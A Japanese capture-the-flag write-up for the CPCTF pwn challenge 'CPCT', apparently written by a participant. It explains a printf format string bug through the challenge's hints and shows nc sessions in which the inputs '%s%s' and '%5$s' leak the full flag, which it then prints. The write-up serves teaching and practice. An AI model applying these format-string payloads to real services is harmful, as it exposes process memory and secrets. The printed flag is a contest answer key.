# CPCT......:Pwn:13.54pts
等価交換って良いですよね。ということで、入力した文字数の分だけflagをあげます！  
でも貰いすぎても困るので4文字以内でお願いします……  
`nc cpct.web.cpctf.space 30006`  

[配布ファイル](cpct.zip)  

**Hint1**  
flagをすべて得るには、lengthの値がflagの長さ以上となる必要があります。  
lengthに値を代入している場所を見てみましょう。そこに脆弱性があります。  
**Hint2**  
ズバリ、脆弱性があるのは32行目のprintf関数です。  
printf関数の脆弱性を調べてみると、Format String Bug というものが見つかるはずです。  
この関数でよく使われる、ある記法が重要です。  
**Hint3 (解法)**  
printf関数で使われるフォーマット指定子を入力に含むことで、本来とは違う動作を引き起こすことができます。  
今回は文字を出力できれば良いので、文字を表す %c を使うとよさそうです。  
ここで、 %10c のように間に数字を入れることで、長さを指定することができます。  
今回はできる限りたくさんの文字を出力してほしいので、 %99c などと入力してみましょう。  
これで99文字入力したことになり、無事にflagを得ることができます。  

# Solution
ソースと接続先が渡される。  
試しに接続してみる。  
```bash
$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
sato
Thank you!
Your input:sato
Length: 4
This is your reward!
CPCT
```
最大4文字入力でき、その入力文字数だけフラグの断片が得られる。  
FSBだと予想し、`%s%s`とする。  
```bash
$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%s%s
Thank you!
Your input:Thank you!
Your input:(null)
Length: 28
This is your reward!
CPCTF{1m_50rrY_bu7_i_Hav3_0n
```
フラグが入力文字数以上表示されたが、完全でない。  
`%n$s`がちょうど4文字なのでこれを用いて、レジスタやスタックを読みだしてやればよい。  
```bash
$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%1$s
~~~
$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%5$s
Thank you!
Your input:CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}
Length: 45
This is your reward!
CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}
```
flagが得られた。  

## CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}